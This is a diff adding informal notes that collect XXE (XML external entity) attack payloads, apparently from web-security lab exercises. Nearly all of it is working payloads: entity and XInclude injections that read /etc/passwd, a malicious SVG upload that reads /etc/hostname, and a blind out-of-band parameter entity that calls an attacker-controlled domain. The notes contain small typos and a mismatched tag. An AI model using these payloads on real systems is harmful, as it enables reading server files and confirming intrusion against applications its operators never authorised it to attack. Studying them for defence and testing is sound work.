@@ -1,2 +1,31 @@
-xxe:
+xxe: <productID>6</productId>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+
+Bxxe:  (normal paramter eg: productId=122&storeid=1)
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+eg: productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+
+XXE attacks via file upload:
+
+Create a local SVG image with the following content:
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+
+Bxss-2 When the percent character before the entity name:(%)
+
+<!ENTITY % myparameterentity "my parameter entity value" >
+
+And second, parameter entities are referenced using the percent character instead of the usual ampersand:
+
+%myparameterentity;
+
+This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:
+
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+
+This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.
+
